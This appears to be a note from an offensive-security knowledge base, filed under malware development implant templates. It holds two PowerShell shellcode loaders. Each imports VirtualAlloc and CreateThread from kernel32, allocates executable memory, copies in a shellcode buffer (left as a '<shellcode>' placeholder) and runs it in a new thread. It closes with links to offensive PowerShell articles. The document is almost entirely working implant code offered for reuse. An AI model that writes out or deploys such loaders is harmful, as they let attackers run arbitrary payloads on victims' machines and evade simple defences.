# PowerShell

### DotNET

```powershell
ï»¿$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = <shellcode>
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0);
```

```powershell
$Code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinAPI = Add-Type -memberDefinition $Code -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $buf = <shellcode>

$addr = $WinAPI::VirtualAlloc(0,[Math]::Max($buf.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$buf.Length)

$WinAPI::CreateThread(0,0,$addr,0,0,0)
```

---
## References

### Backlinks

- [[03 - Malware Development/Global Helpers/Implant Templates/Programming Languages/PowerShell/Implants|Global Helpers: PowerShell Implant]]

### Bordergate

- [Bordergate: Offensive PowerShell](https://www.bordergate.co.uk/offensive-powershell/)

### Mosse Cyber Security Institute

- [Mosse Cyber Security Institute: Powershell Shellcoding: Part 1](https://library.mosse-institute.com/articles/2022/10/powershell-shellcode-part-1.html)